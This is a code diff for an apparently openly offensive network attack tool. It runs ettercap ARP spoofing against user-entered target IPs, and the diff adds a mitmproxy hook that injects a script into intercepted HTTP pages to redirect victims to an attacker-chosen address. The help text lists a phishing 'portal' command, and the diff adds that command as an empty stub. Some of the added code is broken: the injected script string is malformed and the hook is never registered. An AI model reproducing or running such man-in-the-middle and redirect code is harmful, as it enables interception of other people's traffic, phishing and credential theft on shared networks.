@@ -6,6 +6,7 @@ import sys, traceback
 import os
 import subprocess as sp
 import time
+import mitmproxy
 
 # Start banner
 os.system("cat src/banner.txt | lolcat")
@@ -58,7 +59,7 @@ def main():
                         ipstring = ' '.join([str(arpip) for arpip in iplistformatted])
                         print(ipstring)
                         try:
-                            os.popen("sudo ettercap -Tq -M ARP "+ ipstring)\
+                            os.popen("sudo ettercap -Tq -M ARP "+ ipstring)
                         except:
                             print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mPlease make sure that the IP exists and is formatted correctly!")
                             
@@ -69,8 +70,15 @@ def main():
                 print(" " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1mhtspoof done!")
                 open('src/target.txt', 'w').close()
  
-        def log():
-            return "log"
+        def redirect():
+            spoofip = input("\n"" " "\u001b[34;1mEnter the IP address to redirect to (IP:PORT): ")
+            def response(flow):
+                flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://"+spoofip+"</script>")
+            
+        def portal():
+            return 0
+            
+            
 
         def commands():
             helpstr = '''\n\n Available Commands:           
@@ -83,8 +91,6 @@ def main():
 
                             \u001b[33;1mhtspoof - Redirect user to specific webpage
 
-                            \u001b[33;1mlog - View the active log of current network
-
                             \u001b[33;1mredirect - Set the redirection IP for all HTTP pages
 
                             \u001b[33;1mportal - Generate phishing page/portal for redirection
@@ -96,7 +102,7 @@ def main():
 
         def shell():
  
-            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"log":log,"commands":commands,"clear":clear}
+            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"redirect":redirect,"commands":commands,"portal":portal,"clear":clear}
 
             info_splash()
 
